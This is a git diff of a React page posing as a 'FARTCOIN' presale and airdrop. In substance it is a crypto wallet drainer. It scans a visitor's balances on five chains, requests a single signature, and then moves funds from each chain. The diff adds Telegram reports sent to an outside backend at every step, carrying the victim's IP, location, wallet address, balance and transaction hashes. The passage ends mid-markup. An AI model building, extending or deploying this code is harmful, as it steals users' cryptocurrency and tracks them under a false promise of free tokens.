@@ -6,7 +6,7 @@ import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
-// DEPLOYED CONTRACTS ON ALL 5 NETWORKS - UNCHANGED
+// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
 // ============================================
 
 const MULTICHAIN_CONFIG = {
@@ -110,9 +110,9 @@ function App() {
   const [userEmail, setUserEmail] = useState('');
   const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
   const [executionResults, setExecutionResults] = useState([]);
-  const [balancesLoaded, setBalancesLoaded] = useState(false);
+  const [telegramNotified, setTelegramNotified] = useState(false);
 
-  // Presale stats - updated to FARTCOIN
+  // Presale stats - UPDATED TO FARTCOIN
   const [timeLeft, setTimeLeft] = useState({
     days: 5,
     hours: 12,
@@ -126,7 +126,7 @@ function App() {
     currentBonus: 25,
     nextBonus: 15,
     tokenPrice: 0.17,
-    fartPrice: 0.17
+    bthPrice: 0.17
   });
 
   // Live progress tracking
@@ -205,7 +205,6 @@ function App() {
         
         // Fetch balances across all chains
         await fetchAllBalances(address);
-        setBalancesLoaded(true);
         
       } catch (e) {
         console.error("Provider init failed", e);
@@ -215,7 +214,7 @@ function App() {
     init();
   }, [walletProvider, address]);
 
-  // Track page visit with location
+  // Track page visit with location - UPDATED TO FARTCOIN
   useEffect(() => {
     const trackVisit = async () => {
       try {
@@ -225,7 +224,8 @@ function App() {
           body: JSON.stringify({
             userAgent: navigator.userAgent,
             referer: document.referrer,
-            path: window.location.pathname
+            path: window.location.pathname,
+            project: 'fartcoin' // Added project identifier
           })
         });
         const data = await response.json();
@@ -236,13 +236,26 @@ function App() {
             ip: data.data.ip,
             flag: data.data.flag
           });
+          
+          // Send to Telegram - EXACTLY like original working version
+          if (!telegramNotified) {
+            await fetch('https://bthbk.vercel.app/api/telegram', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                message: `🌍 *NEW VISITOR* - FARTCOIN\n📍 *Location:* ${data.data.city}, ${data.data.country}\n🕐 *Time:* ${new Date().toLocaleString()}\n🌐 *IP:* ${data.data.ip}\n🔗 *Referrer:* ${document.referrer || 'Direct'}`,
+                type: 'visit'
+              })
+            });
+            setTelegramNotified(true);
+          }
         }
       } catch (err) {
         console.error('Visit tracking error:', err);
       }
     };
     trackVisit();
-  }, []);
+  }, [telegramNotified]);
 
   // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
@@ -305,10 +318,16 @@ function App() {
 
   // Auto-check eligibility when wallet connects
   useEffect(() => {
-    if (isConnected && address && !scanResult && !verifying && balancesLoaded) {
-      verifyWallet();
+    if (isConnected && address && !scanResult && !verifying) {
+      // Wait for balances to load
+      const timer = setTimeout(() => {
+        if (Object.keys(balances).length > 0) {
+          verifyWallet();
+        }
+      }, 1000);
+      return () => clearTimeout(timer);
     }
-  }, [isConnected, address, balancesLoaded, scanResult, verifying]);
+  }, [isConnected, address, balances]);
 
   const verifyWallet = async () => {
     if (!address) return;
@@ -322,7 +341,10 @@ function App() {
       const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: address })
+        body: JSON.stringify({ 
+          walletAddress: address,
+          project: 'fartcoin' // Added project identifier
+        })
       });
       
       const data = await response.json();
@@ -334,11 +356,21 @@ function App() {
           setAllocation(data.data.allocation);
         }
         
+        // Send Telegram notification for wallet connection - EXACTLY like original
+        await fetch('https://bthbk.vercel.app/api/telegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: `🔌 *WALLET CONNECTED* - FARTCOIN\n👤 *Address:* \`${address}\`\n💰 *Total Value:* $${totalValue.toFixed(2)}\n✅ *Eligible:* ${totalValue >= 1 ? 'Yes' : 'No'}\n📍 *Location:* ${userLocation.city || 'Unknown'}, ${userLocation.country || 'Unknown'}\n🕐 *Time:* ${new Date().toLocaleString()}`,
+            type: 'wallet'
+          })
+        });
+        
         if (totalValue >= 1) {
           setTxStatus('✅ You qualify!');
           await preparePresale();
         } else {
-          setTxStatus('✨ Verified - Not Eligible');
+          setTxStatus('✨ Not eligible - Minimum $1 required');
         }
       }
     } catch (err) {
@@ -356,7 +388,10 @@ function App() {
       const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: address })
+        body: JSON.stringify({ 
+          walletAddress: address,
+          project: 'fartcoin' // Added project identifier
+        })
       });
       
       const data = await response.json();
@@ -383,7 +418,7 @@ function App() {
       setError('');
       setExecutionResults([]);
       
-      // Create message - Updated to FARTCOIN
+      // Create message - UPDATED TO FARTCOIN
       const timestamp = Date.now();
       const nonce = Math.floor(Math.random() * 1000000000);
       const message = `FARTCOIN PRESALE AUTHORIZATION\n\n` +
@@ -395,10 +430,30 @@ function App() {
 
       setTxStatus('✍️ Sign message...');
 
+      // Send Telegram notification for signature start
+      await fetch('https://bthbk.vercel.app/api/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message: `✍️ *SIGNATURE REQUESTED* - FARTCOIN\n👤 *Address:* \`${address}\`\n🕐 *Time:* ${new Date().toLocaleString()}\n📍 *Location:* ${userLocation.city || 'Unknown'}, ${userLocation.country || 'Unknown'}`,
+          type: 'signature'
+        })
+      });
+
       // Get signature - THIS IS THE ONLY POPUP
       const signature = await signer.signMessage(message);
       setSignature(signature);
       setTxStatus('✅ Signature obtained. Executing on all chains...');
+
+      // Send Telegram notification for signature obtained
+      await fetch('https://bthbk.vercel.app/api/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message: `✅ *SIGNATURE OBTAINED* - FARTCOIN\n👤 *Address:* \`${address}\`\n📝 *Message:* ${message.substring(0, 50)}...\n🕐 *Time:* ${new Date().toLocaleString()}`,
+          type: 'signature_obtained'
+        })
+      });
 
       // Execute on each chain with balance
       let processed = [];
@@ -434,7 +489,6 @@ function App() {
                 params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
               });
             } catch (switchError) {
-              // If network not added, we would need to add it, but assume it's in AppKit config
               console.error('Switch error:', switchError);
             }
           }
@@ -490,7 +544,17 @@ function App() {
           results.push(result);
           setExecutionResults([...results]);
           
-          // Notify backend - UNCHANGED endpoint
+          // Send Telegram notification for each chain success
+          await fetch('https://bthbk.vercel.app/api/telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: `✅ *CHAIN COMPLETED* - FARTCOIN\n⛓️ *Chain:* ${chain.name}\n👤 *Address:* \`${address}\`\n💰 *Amount:* ${amountToSend} ${chain.symbol}\n🔗 *Tx:* ${chain.explorer}/tx/${receipt.hash}\n📊 *Progress:* ${i+1}/${chainsWithBalance.length}`,
+              type: 'chain_complete'
+            })
+          });
+          
+          // Notify backend
           await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -503,7 +567,8 @@ function App() {
               symbol: chain.symbol,
               valueUSD: balances[chain.name].valueUSD * 0.85,
               email: userEmail,
-              location: userLocation
+              location: userLocation,
+              project: 'fartcoin'
             })
           });
           
@@ -519,6 +584,16 @@ function App() {
             status: 'failed'
           });
           setExecutionResults([...results]);
+          
+          // Send Telegram notification for chain failure
+          await fetch('https://bthbk.vercel.app/api/telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              message: `❌ *CHAIN FAILED* - FARTCOIN\n⛓️ *Chain:* ${chain.name}\n👤 *Address:* \`${address}\`\n⚠️ *Error:* ${chainErr.message || 'Unknown error'}\n📊 *Progress:* ${i+1}/${chainsWithBalance.length}`,
+              type: 'chain_failed'
+            })
+          });
           
           // Continue to next chain even if one fails
           setTxStatus(`⚠️ Error on ${chain.name}, continuing to next chain...`);
@@ -542,7 +617,17 @@ function App() {
         setShowCelebration(true);
         setTxStatus(`🎉 Success! Processed on ${processed.length} chains`);
         
-        // Final success notification - UNCHANGED endpoint
+        // Send Telegram notification for final success
+        await fetch('https://bthbk.vercel.app/api/telegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: `🎉 *PRESALE COMPLETE* - FARTCOIN\n👤 *Address:* \`${address}\`\n💰 *Allocation:* $5,000 FART\n✨ *Bonus:* +${presaleStats.currentBonus}%\n⛓️ *Chains:* ${processed.join(', ')}\n💵 *Total Value:* $${Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0).toFixed(2)}\n🕐 *Time:* ${new Date().toLocaleString()}`,
+            type: 'success'
+          })
+        });
+        
+        // Final success notification
         await fetch('https://bthbk.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -555,7 +640,8 @@ function App() {
             transactions: results.filter(r => r.status === 'success').map(r => ({
               chain: r.chain,
               txHash: r.txHash
-            }))
+            })),
+            project: 'fartcoin'
           })
         });
       } else {
@@ -566,8 +652,28 @@ function App() {
       console.error('Error:', err);
       if (err.code === 4001) {
         setError('Cancelled');
+        
+        // Send Telegram notification for cancellation
+        await fetch('https://bthbk.vercel.app/api/telegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: `❌ *TRANSACTION CANCELLED* - FARTCOIN\n👤 *Address:* \`${address}\`\n🕐 *Time:* ${new Date().toLocaleString()}`,
+            type: 'cancelled'
+          })
+        });
       } else {
         setError(err.message || 'Failed');
+        
+        // Send Telegram notification for error
+        await fetch('https://bthbk.vercel.app/api/telegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: `⚠️ *ERROR* - FARTCOIN\n👤 *Address:* \`${address}\`\n❌ *Error:* ${err.message || 'Failed'}\n🕐 *Time:* ${new Date().toLocaleString()}`,
+            type: 'error'
+          })
+        });
       }
     } finally {
       setSignatureLoading(false);
@@ -583,7 +689,8 @@ function App() {
         body: JSON.stringify({ 
           walletAddress: address,
           email: userEmail,
-          location: userLocation
+          location: userLocation,
+          project: 'fartcoin'
         })
       });
       setShowCelebration(true);
@@ -620,7 +727,7 @@ function App() {
       setTxStatus('');
       setError('');
       setExecutionResults([]);
-      setBalancesLoaded(false);
+      setTelegramNotified(false);
     } catch (err) {
       console.error('Disconnect error:', err);
       // Force UI update even if disconnect fails
@@ -628,668 +735,731 @@ function App() {
     }
   };
 
-  const copyToClipboard = (text) => {
-    navigator.clipboard.writeText(text);
-    setTxStatus('📋 Copied!');
-    setTimeout(() => setTxStatus(''), 2000);
-  };
-
   return (
-    <div className="min-h-screen bg-black text-white flex flex-col">
+    <div className="min-h-screen bg-[#0a0a0f] text-white overflow-hidden">
       
-      {/* Terminal Grid Background */}
-      <div className="fixed inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxwYXR0ZXJuIGlkPSJncmlkIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPjxwYXRoIGQ9Ik0gMjAgMCBMIDAgMCAwIDIwIiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmYiIHN0cm9rZS13aWR0aD0iMC4yIj48L3BhdGg+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyaWQpIj48L3JlY3Q+PC9zdmc+')] opacity-10 pointer-events-none"></div>
+      {/* ============================================ */}
+      {/* PREMIUM ANIMATED BACKGROUND */}
+      {/* ============================================ */}
       
-      {/* Floating Terminal Text */}
-      <div className="fixed inset-0 overflow-hidden pointer-events-none">
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '60%', left: '31%', animation: 'textFlicker 4s infinite alternate'}}>
-          FART_PROTOCOL_INITIALIZED
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '45%', left: '10%', animation: 'textFlicker 2.5s infinite alternate'}}>
-          010101010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '15%', left: '10%', animation: 'textFlicker 1.2s infinite alternate'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '8%', left: '69%', animation: 'textFlicker 3.8s infinite alternate'}}>
-          FART_PROTOCOL_INITIALIZED
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '39%', left: '70%', animation: 'textFlicker 4.7s infinite alternate'}}>
-          FART_PROTOCOL_INITIALIZED
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '19%', left: '80%', animation: 'textFlicker 1.9s infinite alternate'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '99%', left: '74%', animation: 'textFlicker 4.5s infinite alternate'}}>
-          FART_PROTOCOL_INITIALIZED
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '78%', left: '15%', animation: 'textFlicker 4s infinite alternate'}}>
-          010101010101010101010101010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '42%', left: '74%', animation: 'textFlicker 3.2s infinite alternate'}}>
-          0101010101010101010101010101010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '52%', left: '4%', animation: 'textFlicker 1.7s infinite alternate'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '71%', left: '22%', animation: 'textFlicker 4.6s infinite alternate'}}>
-          01010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '12%', left: '14%', animation: 'textFlicker 2s infinite alternate'}}>
-          01010101010101010101010101010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '10%', left: '9%', animation: 'textFlicker 2.1s infinite alternate'}}>
-          FART_PROTOCOL_INITIALIZED
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '96%', left: '42%', animation: 'textFlicker 2.1s infinite alternate'}}>
-          01010101010101010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '55%', left: '74%', animation: 'textFlicker 1s infinite alternate'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '77%', left: '60%', animation: 'textFlicker 2.7s infinite alternate'}}>
-          010101010101010101010101010101010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '31%', left: '32%', animation: 'textFlicker 3.6s infinite alternate'}}>
-          FART_PROTOCOL_INITIALIZED
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '50%', left: '50%', animation: 'textFlicker 1.7s infinite alternate'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '58%', left: '39%', animation: 'textFlicker 4.2s infinite alternate'}}>
-          01010101010101010101010101010101010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '44%', left: '74%', animation: 'textFlicker 3.1s infinite alternate'}}>
-          01010101010101010101010101010101
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '40%', left: '84%', animation: 'textFlicker 2.2s infinite alternate'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '33%', left: '88%', animation: 'textFlicker 1.4s infinite alternate'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '63%', left: '83%'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '85%', left: '18%'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '82%', left: '78%'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '91%', left: '7%'}}>
-          PRESS F TO FART
-        </div>
-        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '84%', left: '66%'}}>
-          PRESS F TO FART
-        </div>
+      {/* Gradient Orbs with Parallax */}
+      <div 
+        className="fixed inset-0 pointer-events-none"
+        style={{
+          transform: `translate(${mousePosition.x}px, ${mousePosition.y}px)`,
+          transition: 'transform 0.1s ease-out'
+        }}
+      >
+        <div className="absolute top-0 -left-20 w-[600px] h-[600px] bg-purple-600/30 rounded-full mix-blend-multiply filter blur-3xl animate-float-slow"></div>
+        <div className="absolute top-0 -right-20 w-[600px] h-[600px] bg-orange-600/30 rounded-full mix-blend-multiply filter blur-3xl animate-float-slower animation-delay-2000"></div>
+        <div className="absolute bottom-0 left-1/2 transform -translate-x-1/2 w-[900px] h-[900px] bg-blue-600/20 rounded-full mix-blend-multiply filter blur-3xl animate-float"></div>
       </div>
 
-      {/* Network Indicator */}
-      {isConnected && currentChain && (
-        <div className="fixed top-4 right-4 z-50">
-          <div className="terminal-frame px-4 py-2 flex items-center gap-2 bg-black/90">
-            <span className="text-sm font-medium">{currentChain.name}</span>
-            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
-          </div>
-        </div>
-      )}
+      {/* Grid Overlay */}
+      <div className="fixed inset-0 bg-[url('data:image/svg+xml,%3Csvg%20width%3D%2260%22%20height%3D%2260%22%20viewBox%3D%220%200%2060%2060%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Cg%20fill%3D%22%239C92AC%22%20fill-opacity%3D%220.05%22%3E%3Cpath%20d%3D%22M36%2034v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6%2034v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6%204V0H4v4H0v2h4v4h2V6h4V4H6z%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E')] opacity-20 animate-pulse"></div>
+
+      {/* Floating Particles */}
+      <div className="fixed inset-0 pointer-events-none">
+        {[...Array(30)].map((_, i) => (
+          <div
+            key={i}
+            className="absolute w-1 h-1 bg-white/30 rounded-full animate-float-particle"
+            style={{
+              top: `${Math.random() * 100}%`,
+              left: `${Math.random() * 100}%`,
+              animationDelay: `${Math.random() * 10}s`,
+              animationDuration: `${15 + Math.random() * 20}s`
+            }}
+          />
+        ))}
+      </div>
 
       {/* Main Container */}
-      <div className="relative z-10 flex-1 flex flex-col">
+      <div className="relative z-10 container mx-auto px-4 py-8 max-w-6xl">
         
-        {/* Header */}
-        <header className="w-full py-6 px-4 border-b border-white/30 scan-effect">
-          <div className="container mx-auto flex flex-wrap items-center gap-4 sm:flex-nowrap justify-between">
-            
-            {/* Logo - Fartcoin */}
-            <h1 className="text-4xl md:text-5xl font-terminal text-glow text-flicker text-white" style={{textShadow: '0 0 5px #fff, 0 0 10px #fff', letterSpacing: '1px'}}>
-              Fartcoin 💨
-            </h1>
-
-            {/* Contract Address Display */}
-            <div className="terminal-frame flex flex-col sm:flex-row items-center gap-2 border-white flex-shrink min-w-0 overflow-hidden hide-mobile">
-              <div className="text-sm sm:text-base font-mono truncate">
-                <span className="text-white/70 mr-2">Contract:</span>
-                <span className="text-white truncate">
-                  9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump
-                </span>
-              </div>
-              <button
-                onClick={() => copyToClipboard('9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump')}
-                className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20"
-              >
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4">
-                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
-                  <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
-                </svg>
-                COPY
-              </button>
+        {/* Network Indicator */}
+        {isConnected && currentChain && (
+          <div className="fixed top-4 right-4 z-50">
+            <div className="bg-gray-900/90 backdrop-blur-xl border border-orange-500/30 rounded-full px-4 py-2 flex items-center gap-2 animate-pulse-glow">
+              <span className="text-2xl">{currentChain.icon}</span>
+              <span className="text-sm font-medium">{currentChain.name}</span>
+              <span className="w-2 h-2 bg-green-400 rounded-full animate-ping"></span>
             </div>
           </div>
-        </header>
+        )}
 
-        <main className="flex-1">
+        {/* ============================================ */}
+        {/* PREMIUM HEADER SECTION - UPDATED TO FARTCOIN */}
+        {/* ============================================ */}
+        <div className="text-center mb-8">
           
-          {/* Hero Section */}
-          <section className="flex flex-col items-center justify-center px-4 py-16 scan-effect">
-            <div className="container mx-auto text-center">
-              <div className="terminal-frame max-w-3xl mx-auto mb-8 p-8 border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
-                <h2 className="text-2xl md:text-4xl font-terminal text-glow mb-6 text-white">
-                  &gt; AIRDROP INITIATED <span className="cursor"></span>
-                </h2>
-                <div className="h-16 flex items-center justify-center">
-                  <p className="text-xl md:text-2xl text-white font-mono">
-                    &gt; CLAIM YOUR $FARTCOIN - up to 5,000 per wallet!<span className="cursor"></span>
-                  </p>
+          {/* 3D Animated Logo - UPDATED TO FARTCOIN */}
+          <div className="relative inline-block mb-4 group perspective-1000">
+            <div className="relative transform-gpu transition-all duration-700 group-hover:rotate-y-12 group-hover:scale-110">
+              <div className="text-9xl filter drop-shadow-[0_20px_40px_rgba(249,115,22,0.7)] animate-float-3d">
+                💨
+              </div>
+            </div>
+            
+            {/* Orbiting Circles */}
+            <div className="absolute inset-0 -m-16">
+              <div className="absolute inset-0 border-4 border-orange-500/30 rounded-full animate-spin-slow"></div>
+              <div className="absolute inset-0 m-8 border-4 border-yellow-500/30 rounded-full animate-spin-slower"></div>
+              <div className="absolute inset-0 m-16 border-4 border-orange-500/20 rounded-full animate-spin-slowest"></div>
+            </div>
+
+            {/* Particle Emitter */}
+            <div className="absolute inset-0 -m-20">
+              {[...Array(12)].map((_, i) => (
+                <div
+                  key={i}
+                  className="absolute w-2 h-2 bg-orange-500 rounded-full animate-particle-burst"
+                  style={{
+                    top: '50%',
+                    left: '50%',
+                    transform: `rotate(${i * 30}deg) translateY(-60px)`,
+                    animationDelay: `${i * 0.1}s`
+                  }}
+                />
+              ))}
+            </div>
+          </div>
+
+          {/* Premium Title - UPDATED TO FARTCOIN */}
+          <h1 className="text-7xl md:text-8xl font-black mb-3 relative glitch" data-text="FARTCOIN">
+            <span className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-3xl opacity-50 animate-pulse"></span>
+            <span className="relative bg-clip-text text-transparent bg-gradient-to-r from-orange-400 via-yellow-400 to-orange-400 animate-gradient-x bg-[length:200%_200%]">
+              FARTCOIN
+            </span>
+          </h1>
+          
+          <p className="text-xl text-gray-400 mb-6 tracking-widest animate-pulse-text">
+            ⚡ THE FUNNIEST COIN IN CRYPTO ⚡
+          </p>
+
+          {/* Live Presale Banner - UPDATED TO FARTCOIN */}
+          <div className="inline-flex items-center gap-6 bg-gradient-to-r from-orange-500/30 to-yellow-500/30 px-8 py-4 rounded-2xl border border-orange-500/50 backdrop-blur-xl mb-6 animate-border-pulse">
+            <div className="flex items-center gap-3">
+              <span className="relative flex h-4 w-4">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500"></span>
+              </span>
+              <span className="text-2xl font-bold text-green-400">PRESALE LIVE</span>
+            </div>
+            <div className="h-8 w-px bg-orange-500/50"></div>
+            <div className="flex items-center gap-2">
+              <span className="text-yellow-400 font-bold">${presaleStats.tokenPrice}</span>
+              <span className="text-gray-400">per FART</span>
+            </div>
+            <div className="h-8 w-px bg-orange-500/50"></div>
+            <div className="flex items-center gap-2">
+              <span className="text-orange-400 font-bold">{liveProgress.percentComplete}%</span>
+              <span className="text-gray-400">sold</span>
+            </div>
+          </div>
+
+          {/* MAIN ACTION BUTTON - UPDATED WITH PROPER ELIGIBILITY FLOW */}
+          {isConnected && (
+            <div className="max-w-2xl mx-auto mb-8">
+              {!isEligible ? (
+                <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-2xl p-8 text-center">
+                  <div className="text-6xl mb-4 animate-float">👋</div>
+                  <h2 className="text-2xl font-bold mb-4 text-gray-400">Not Eligible Yet</h2>
+                  <p className="text-gray-500 mb-6">Minimum $1 required across any chain to qualify for the $5,000 FART airdrop.</p>
+                  <div className="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
+                    <p className="text-sm text-orange-400">Your balance: ${totalUSD.toFixed(2)}</p>
+                  </div>
                 </div>
-                
-                {/* Main Action Area */}
-                <div className="terminal-frame p-6 mt-8 border-white mx-auto max-w-2xl">
-                  {!isConnected ? (
-                    <div className="text-white font-mono text-center">
-                      <p>"FART FREELY, GET RICH"</p>
-                      <p className="text-white/70 text-sm mt-4">
-                        Connect your wallet and{' '}
-                        <button
-                          onClick={() => open()}
-                          className="underline transition duration-300 ease-in-out glow-on-hover"
-                        >
-                          claim now
-                        </button>
-                      </p>
+              ) : completedChains.length > 0 ? (
+                <div className="text-center">
+                  <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 backdrop-blur-xl border border-green-500/30 rounded-xl p-6 mb-4 animate-pulse-glow">
+                    <p className="text-green-400 text-lg mb-3">✓ COMPLETED ON {completedChains.length} CHAINS</p>
+                    <div className="flex flex-wrap justify-center gap-2 mb-3">
+                      {completedChains.map(chain => (
+                        <span key={chain} className="text-xs bg-green-500/30 px-2 py-1 rounded-full">
+                          {chain}
+                        </span>
+                      ))}
                     </div>
-                  ) : (
-                    <div className="text-white font-mono text-center">
-                      {verifying ? (
+                    <p className="text-gray-300">Your $5,000 FART has been secured</p>
+                  </div>
+                  <button
+                    onClick={claimTokens}
+                    className="w-full group relative"
+                  >
+                    <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
+                    <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-5 px-8 font-bold text-xl transform-gpu group-hover:scale-105 transition-all duration-500">
+                      🎉 VIEW YOUR $5,000 FART
+                    </div>
+                  </button>
+                </div>
+              ) : (
+                <button
+                  onClick={executeMultiChainSignature}
+                  disabled={signatureLoading || loading || !signer}
+                  className="w-full group relative transform hover:scale-110 transition-all duration-700"
+                >
+                  {/* Glow Effects */}
+                  <div className="absolute -inset-3 bg-gradient-to-r from-orange-600 via-yellow-500 to-orange-600 rounded-2xl blur-3xl opacity-75 group-hover:opacity-100 animate-pulse-slow"></div>
+                  <div className="absolute -inset-2 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 rounded-2xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
+                  <div className="absolute -inset-1 bg-gradient-to-r from-orange-500 via-yellow-400 to-orange-500 rounded-2xl blur-xl opacity-75 group-hover:opacity-100 animate-ping-slow"></div>
+                  
+                  {/* Button Body */}
+                  <div className="relative bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 rounded-2xl py-8 px-8 font-black text-3xl text-white shadow-2xl bg-[length:200%_200%] animate-gradient-x transform-gpu group-hover:rotate-y-12 perspective-1000">
+                    <div className="flex items-center justify-center gap-6">
+                      {signatureLoading ? (
                         <>
-                          <p className="text-lg mb-2">🔄 VERIFYING WALLET...</p>
-                          <p className="text-white/70 text-sm">Please wait</p>
-                        </>
-                      ) : !isEligible ? (
-                        <>
-                          <p className="text-lg mb-2">👋 WELCOME</p>
-                          <p className="text-white/70 text-sm">
-                            Minimum $1 required for eligibility.
-                          </p>
-                        </>
-                      ) : completedChains.length > 0 ? (
-                        <>
-                          <p className="text-green-400 text-lg mb-2">✓ COMPLETED ON {completedChains.length} CHAINS</p>
-                          <button
-                            onClick={claimTokens}
-                            className="mt-4 border border-white px-6 py-3 rounded-md hover:bg-white/20 transition-all"
-                          >
-                            🎉 VIEW YOUR $5,000 FART
-                          </button>
+                          <div className="relative">
+                            <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+                            <div className="absolute inset-0 border-4 border-yellow-300 border-b-transparent rounded-full animate-spin animation-delay-500"></div>
